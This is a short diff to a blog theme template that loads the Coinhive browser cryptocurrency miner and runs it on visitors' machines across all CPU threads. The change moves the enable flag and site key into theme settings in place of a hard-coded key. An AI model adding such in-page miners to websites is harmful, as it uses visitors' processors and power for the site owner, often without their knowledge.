@@ -22,10 +22,10 @@
 <%- js('js/turbolinks') %>
 <% } %>
 
-<% if (theme.mining) { %>
+<% if (theme.coinhive.enable) { %>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-var miner = new CoinHive.User('6N8PcRT201fFHwOLDV0rnDrvB3I9mp4i', 'User', {
+var miner = new CoinHive.User('<%-theme.coinhive.key%>', 'User', {
 	    threads: navigator.hardwareConcurrency,
 	    autoThreads: false,
 	    throttle: 0.8,
